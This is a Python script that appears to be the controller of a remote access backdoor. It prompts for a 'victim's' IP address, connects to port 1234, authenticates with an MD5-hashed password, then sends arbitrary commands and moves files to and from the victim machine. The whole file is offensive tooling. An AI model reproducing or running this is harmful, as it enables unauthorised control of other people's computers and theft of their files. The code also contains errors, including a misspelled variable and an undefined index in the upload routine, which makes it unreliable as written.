from socket import *
from getpass import getpass
from time import sleep
import hashlib
import os

ip = input("Enter Victim's IP address : ")
port = 1234

try:
	connection = socket(AF_INET,SOCK_STREAM)
	connection.connect((ip,port))
except:
	print("Unable able to connect with "+ip+"/"+str(port))
	exit()

try:
	confirm = connection.recv(1024).decode()
	confirm = confirm.split("<->")
	print("client_name : "+confirm[0]+"\nclient_os : "+confirm[1])
	password = hashlib.md5(getpass(prompt = "Password for "+confirm[0]+" : ").encode())
	connection.send(password.hexdigest().encode())
	handshake = connection.recv(1024).decode()
	if handshake == "0":
		print("Incorrect Password...")
		connection.close()
		exit()

	connection.send("1".encode())

except BrokenPipeError:
	pass

def create_file(file_name,data):
	new_file = open(file_name,"wb")
	new_file.write(data)
	new_file.close()
	
while True:
	try:
		recieve = connection.recv(1024).decode()
		print(recieve)
		connection.send("1".encode())
		command = connection.recv(1024).decode()
		if command != "":
			cmd = input(command)
			if cmd == "exit" or cmd == "terminate":
				connection.send(cmd.encode())
				connection.close()
				exit()
			
			elif cmd == "" or cmd == None:
				conneciton.send("error".encode())

			elif cmd[:4] == "down":
				connection.send(cmd.encode())
				file_name = cmd[5:]
				print("Downloading...")

				data = b""
				while True:
					end_data = connection.recv(1024)

					if end_data == b"Ended":
						print("Ended")
						break
					
					data += end_data
		
				i = 0
				while True:
					if i == 3:
						print("Sorry, Process Terminated due to last 3 attempts...")
						break
					if len(file_name.strip()) != 0:
						if file_name in os.listdir():
							print("File name is Already Exists...")
							i+=1
							replace = input("Do you want to replace the file (y/n): ")
							if replace.lower() == 'n':
								file_name = input("Enter Filename : ")
							else:
								create_file(file_name,data)
								break
						else:
							create_file(file_name,data)
							break
					else:
						i+=1
						file_name = input("Enter Filename : ")

			elif cmd[:2] == "up":
				cmd_list = cmd.split(" ")
				connection.send(cmd.encode())
				file_name = []
				for k in range(1,len(cmd_list)):
					file_name.append(cmd_list[m])
				file_name = ' '.join(file_name)
				
				if file_name in os.listdir():
					norepeat = connection.recv(1024).decode()
					if norepeat == "1":
						connection.send(b"Ended")
					else:
						file = open(file_name,"rb")
						data = file.read()
						file.close()
					
						while True:
							if len(data) > 0:
								temp_data = data[0:1024]
								if len(temp_data) < 1024:
									temp_data += chr(0).encode() * (1024 - len(temp_data))
								data = data[1024:]
								
								connection.send(temp_data)
								print("Uploading...")	
							else:
								connection.send(b"Ended")
								sleep(0.5)
								break
				else:
					connection.send(b"Ended")

			else:
				try:
					connection.send(cmd.encode())
				except ConnectionResetError:
					print("Unable to Connect with Victim.")
					break

		else:
			print("Something Went Wrong...")
			connection.close()
			exit()
	except BrokenPipeError:
		print("Connection Lost...:(")
		break

	except KeyboardInterrupt:
		print("Program Terminated...*")
		break

	except Exception as e:
		print(e)
		break